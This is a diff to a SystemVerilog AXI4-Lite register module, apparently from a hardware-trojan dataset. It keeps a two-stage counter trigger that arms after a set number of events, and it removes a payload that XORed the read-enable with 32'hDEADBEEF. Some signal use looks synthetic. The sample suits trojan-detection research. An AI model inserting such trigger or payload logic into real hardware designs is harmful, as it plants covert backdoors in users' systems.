@@ -23,22 +23,21 @@ module Axi4LitePlToPsControlRegister_trojan_Integrity
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=13419)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 13630;
+    localparam int TRIGGER_THRESHOLD = 13419;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge S_AXI_ACLK or negedge rst_ni) begin
-        if (!rst_ni) begin
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge S_AXI_ACLK or negedge rst) begin
+        if (!rst) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|SerialDataPath) trojan_counter <= trojan_counter + 1;
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && SerialDataPath) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
@@ -143,7 +142,7 @@ module Axi4LitePlToPsControlRegister_trojan_Integrity
     // Implement memory mapped register select and read logic generation
     // Slave register read enable is asserted when valid address is available
     // and the slave is ready to accept the read address.
-    assign slv_reg_rden = trojan_active ? (axi_arready & port.S_AXI_ARVALID & ~axi_rvalid ^ 32'hDEADBEEF) : axi_arready & port.S_AXI_ARVALID & ~axi_rvalid;
+    assign slv_reg_rden = axi_arready & port.S_AXI_ARVALID & ~axi_rvalid;
 
     // Output register or memory read data
     always_ff @( posedge port.S_AXI_ACLK )
